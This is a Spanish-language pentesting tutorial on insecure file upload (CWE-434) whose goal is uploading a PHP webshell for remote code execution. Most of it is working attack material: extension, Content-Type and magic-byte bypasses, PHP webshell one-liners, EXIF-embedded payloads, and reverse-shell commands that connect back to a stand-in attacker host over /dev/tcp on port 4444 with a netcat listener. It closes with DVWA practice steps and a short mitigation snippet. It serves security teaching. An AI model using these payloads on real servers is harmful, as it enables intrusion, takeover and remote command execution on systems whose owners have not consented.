# Vulnerabilidades en Subida de Archivos

Una validacion incorrecta al subir archivos puede llevar a RCE completo.

OWASP: A04:2021 Insecure Design | CWE-434

## Objetivo

Subir un archivo PHP (webshell) que el servidor ejecute al acceder a el.

## Tecnicas de bypass

### Bypass de extension
```bash
# Si solo valida la extension final:
shell.php.jpg      -> extension doble
shell.pHp          -> mayusculas/minusculas
shell.php5         -> PHP alternativo
shell.phtml        -> PHP antiguo
shell.shtml        -> SSI
shell.php%00.jpg   -> null byte (PHP < 5.3.4)
```

### Bypass de Content-Type
```http
# Cambiar con Burp Suite:
# Original: Content-Type: application/x-php
# Cambiar a: Content-Type: image/jpeg

POST /upload HTTP/1.1
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg     <- cambiar esto

<?php system($_GET['cmd']); ?>
```

### Bypass de magic bytes (firma del archivo)
```bash
# Anadir bytes magicos de imagen al inicio del PHP
printf '\xff\xd8\xff\xe0' > shell.php  # cabecera JPEG
echo '<?php system($_GET["cmd"]); ?>' >> shell.php
# El archivo empieza como JPEG pero contiene PHP
```

### Webshell en metadatos de imagen
```bash
# Incrustar PHP en los metadatos EXIF de una imagen real
exiftool -Comment='<?php system($_GET["cmd"]); ?>' imagen.jpg -o shell.jpg
# El servidor lo guarda como imagen pero si lo incluye con LFI -> RCE
```

## Webshells utiles

```php
# Minimalista
<?php system($_GET['c']); ?>

# Con salida mas limpia
<?php echo shell_exec($_GET['cmd']); ?>

# Con soporte de comandos largos
<?php passthru($_REQUEST['cmd']); ?>

# Reverse shell desde webshell
?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/KALI_IP/4444+0>%261'
```

## Obtener reverse shell

```bash
# En Kali -- escuchar
nc -lvnp 4444

# En la webshell subida -- ejecutar
http://web.com/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/KALI:4444+0>%261'

# O con URL encoding completo
?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FKALI%2F4444%200%3E%261%27
```

## Practica en DVWA

```
1. DVWA -> File Upload -> Security: Low
2. Subir: <?php system($_GET['cmd']); ?> como shell.php
3. Acceder a: http://localhost:8080/hackable/uploads/shell.php?cmd=id
4. Security: Medium -> bypass Content-Type con Burp
5. Security: High -> bypass con exiftool en imagen real
```

## Mitigacion

```php
// Validacion correcta
$allowed_types = ['image/jpeg', 'image/png', 'image/gif'];
$allowed_exts  = ['jpg', 'jpeg', 'png', 'gif'];

$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime  = finfo_file($finfo, $_FILES['file']['tmp_name']);

$ext   = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));

if (!in_array($mime, $allowed_types) || !in_array($ext, $allowed_exts)) {
    die("Archivo no permitido");
}

// Guardar con nombre aleatorio sin extension ejecutable
$new_name = bin2hex(random_bytes(16)) . '.jpg';
```
